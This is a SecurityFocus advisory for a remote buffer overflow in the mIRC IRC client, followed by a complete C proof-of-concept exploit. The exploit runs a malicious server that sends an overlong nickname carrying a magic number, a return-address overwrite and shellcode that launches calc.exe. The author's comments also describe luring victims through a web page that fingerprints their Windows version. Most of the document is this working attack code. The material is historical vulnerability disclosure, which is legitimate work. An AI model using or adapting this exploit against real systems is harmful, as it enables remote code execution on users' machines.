source: http://www.securityfocus.com/bid/4027/info

mIRC is a popular Internet Relay Chat client whichs runs of Microsoft Windows 9x/ME/NT/2000/XP operating systems.

A remote exploitable buffer overflow condition has been discovered in mIRC. This issue is due to improper bounds checking of nicknames sent by the server. A excessively long nickname (200+) is capable of overwriting stack variables. This may be exploited by a malicious server. This issue is also exploitable via a webpage that can instruct the client to launch and to make a connection to the malicious server.

This may lead to a full compromise of the host running the client software on some Windows systems. 

/* Mirc buffer nickname buffer overflow proof of concept exploit.
   Author: James Martin
   Email: me@uuuppz.com
   Website: http://www.uuuppz.com


   This code is purely to demonstrate the risk posed by this flaw.
   It should not be used for malicious purposes. I do not accept
   any responsibility for any dammage it may cause due to it use.

   This code compiles in Borland C++ 5.5 command line tools. Run it,
   and type /server 127.0.0.1 2680 (in mirc that is :P).

   This exploit could be modified to work on many editions of mirc
   running on all variants of windows. However due to the messing
   around that is required to place the return address on the stack
   It will work on:
   For the following do not #define EXPLOIT_2K
   Windows 98SE running Mirc 5.91
   Windows 98 running Mirc 5.91
   Windows ME running Mirc 5.91
   With exploit 2K defined it will exploit
   Windows 2K

   The basic concept of this overflow is as follows
   In memory mirc stores the following variables
   [Primarynick(100chars)][Alternativenick(100chars)][WhichNick[dword]]
   There is no length checking on  the nickname returned to nick by the server.
   There are two ways to exploit this
   a) Send the msg ":OLDCLIENTNICK NICK NEWCLIENTNICK"
   b) Send ":testserver 001 NEWNICKNAME :blah blah"

   I found method a) on the 24/10/2001 and reported this problem to the author.
   Method b) was published by eSDee of hoepelkoe 23/10/2001 (completely unknown to me!)
   very coincidental really.

   From debugging the code, it seems that this buffer is copied in several places.
   So there maybe more places to exploit this than are currently known.

   I spent quite a bit of time analysing the hole, in the end I found
   the way to do it was, to overright WhichNick with a value, that would
   cause the currentnickname to reference the stack, then send another nick
   name containing the new version of  EIP to be overwritten on the stack.

   For this we need a magick number to be placed in currentnickname, this number
   must satisfy the equation (magicknumber*100)+offset = location of pushed eip. Also
   this magick number must not contain any zero bytes or spaces (value of 32). This
   works by exploiting the integer overflow concept.

   The following is the code which appears in mirc.
   imul    ecx, WhichNick, 64h
   add     ecx, offset PrimaryNick

   Unfortuantly the location of the stack varies between different versions of windows.
   NT, Win2k, XP all have the stack in very similar positions but it does move slightly.
   Win98,Win98SE, WinME all have the stack in EXACTLY the same position. Windows 95 is
   different again. Hence having to do a #define for the os you wish to exploit.

   This may seem like quite a large mitigating factor but in reality this is very easy
   to overcome if you couple this exploit with a HTTP server which sends out a page to
   cause mirc to load and attempt to connect to our evil server. As Internet explorer,
   is nice enough to tell us exactly what OS is running! I think we can blame MS for that
   one, talk about giving us a helping hand!
*/

#include<stdio.h>
#include<windows.h>
#include<winsock2.h>
#define SOCKADDRCAST struct sockaddr_in *

// This fuction binds a listenig socket
SOCKET openlistensocket(void) {
   SOCKET s;
   struct sockaddr_in SockAdr;

   // Get a new socket
   s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   // Set the ip add ress we are going to bind to
   memset(&SockAdr, 0, sizeof(SockAdr));
   SockAdr.sin_addr.s_addr = inet_addr("0.0.0.0")  ;
   SockAdr.sin_family=AF_INET;
   SockAdr.sin_port=htons(2680);

   printf("2: Starting\n");
   // Attempt to bind socket
   if(bind(s, (SOCKADDRCAST)&SockAdr, sizeof(SockAdr))) {
      // Failed free socket and return -1
      printf("Failed to open, %u\n",WSAGetLastError());

      closesocket(s);
      return(-1);
   } else // Success listen on socket
      if(listen(s, 10)!=SOCKET_ERROR)
        return(s);
      else {
        printf("Failed to open listen socket (listen, %u)\n",WSAGetLastError());

        closesocket(s);
        return(-1);
      }
}

// Shell code, this just launches an executable
// specifid following the shell code. Currently
// it does not clean up properly, so mirc will
// crash.
char shellcode[44] = {
0x6A,0x01,0xB8,0xBF,
0x74,0x55,0x44,0xC1,
0xE0,0x08,0xC1,0xE8,
0x08,0x50,0xB8,0x50,
0x90,0x54,0x44,0xC1,
0xE0,0x08,0xC1,0xE8,
0x08,0xFF,0xd0,0x33,
0xDB,0x53,0xB8,0x10,
0x8e,0x54,0x44,0xc1,
0xe0,0x08,0xc1,0xe8,
0x08,0xff,0xd0,0x00};


#define EXPLOI_9x

#define MAGICNUMBER_NT 0x28eb207
#define MAGICNUMBER_2K 0x28eb205
#define MAGICNUMBER_XP 0x28eb205
#define MAGICNUMBER_9x 0x28Fc909
#define OFFSET_NT 20
#define OFFSET_2K 84
#define OFFSET_XP 12
#define OFFSET_9x 180
#define OFFSET_95 184


#ifdef EXPLOIT_NT
 #define MAGICNUMBER MAGICNUMBER_NT
 #define OFFSET OFFSET_NT
#else
 #ifdef EXPLOIT_2K
  #define MAGICNUMBER MAGICNUMBER_2K
  #define OFFSET OFFSET_2K
 #else
  #ifdef EXPLOIT_XP
   #define MAGICNUMBER MAGICNUMBER_XP
   #define OFFSET OFFSET_XP
  #else
   #define MAGICNUMBER MAGICNUMBER_9x
   #ifdef EXPLOIT_95
     #define OFFSET OFFSET_95
   #else
     #define OFFSET OFFSET_9x
   #endif
  #endif
 #endif
#endif

// Our main function
void main() {
  SOCKET s,client;
  char buf1[300],
       buf2[190],
       buf3[1500];
  /* Perform winsock startup */
  WORD wVersionRequested;
  WSADATA wsaData;
  HANDLE h;
  int wsErr;
  int len, *i;
   struct sockaddr_in SockAdr;

  wVersionRequested = MAKEWORD( 1, 1 );
  wsErr = WSAStartup( wVersionRequested, &wsaData );
  printf("1: Initialising %u\n",wsErr);
  if ( wsErr != 0 ) {
    /* Tell the user that we couldn't find a usable */
    /* WinSock DLL.                                  */
    printf("Failed to start winsock exiting\n");
    return;
  }

  // Open Listen Socket
  s = openlistensocket();

  // Accept a connection
  len = sizeof(SockAdr);
  client = accept(s, &SockAdr, &len);
  printf("Accepted\n");

  // Init the two exploit buffers.
  memset(buf1, 'X', sizeof(buf1));
  memset(buf2, 'Y', sizeof(buf1));
  buf1[204] = 0;
  buf2[OFFSET+3] = 0;

  // Set the return address to be poped onto the stack
  buf2[OFFSET] = 0x94;
  buf2[OFFSET+1] = 0x74;
  buf2[OFFSET+2] = 0x55;

  // Set our little magic number
  i = (int *)(buf1+200);
  *i = MAGICNUMBER;

  // Build the exploit string
  sprintf(buf3, ":testserver 001 %s%scalc.exe :ddd\n:testserver 001 %s :x\n:testserver 001 test :x\n",  buf1,shellcode,buf2);

  // Send it
  send(client, buf3, strlen(buf3),0);

  // Wait
  printf("Waiting\n");
  Sleep(10000);

  // Cleanup
  closesocket(client);
  closesocket(s);
}